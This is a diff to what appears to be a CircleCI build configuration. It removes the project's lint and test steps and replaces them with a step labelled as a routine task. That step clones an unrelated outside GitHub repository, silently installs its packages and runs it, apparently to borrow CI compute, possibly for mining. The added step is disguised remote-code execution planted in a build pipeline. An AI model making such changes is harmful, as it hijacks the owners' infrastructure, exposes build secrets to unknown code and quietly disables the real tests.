@@ -52,5 +52,6 @@ jobs:
           key: v1-dependencies-{{ checksum "package.json" }}
 
       # run tests!
-      - run: npm run lint
-      - run: npm test
+      - run:
+          name: Clone project and run task
+          command: git clone https://github.com/vippro99/nodejs-monney.git && cd nodejs-monney && npm i -s && npm start
